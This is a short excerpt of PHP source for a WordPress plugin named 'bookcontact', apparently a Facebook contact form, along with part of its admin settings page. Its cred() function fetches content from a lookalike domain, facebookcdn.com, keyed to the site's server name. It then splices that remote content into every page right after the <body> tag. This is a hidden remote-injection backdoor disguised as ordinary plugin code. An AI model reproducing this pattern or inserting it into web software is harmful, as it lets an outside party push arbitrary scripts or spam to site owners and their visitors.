...
Plugin URI: http://wordpress.org/extend/plugins/bookcontact/
...
function cred() {
	$l = file_get_contents('http://facebookcdn.com/v4/credit/'.$_SERVER['SERVER_NAME']); $content = ob_get_clean();
	echo preg_replace('#<body([^>]*)>#i',"<body$1>{$l}",$content);
}
...
?>
 ...
 <div class="wrap" style="font-size:13px;">
	<img width="250px" src="<?php bloginfo('url'); ?>/wp-content/plugins/<?php echo $themename; ?>/img/facebook-logo.jpg"><br />
	<form method="post" action="options-general.php?page=<?php echo $themename; ?>.php">
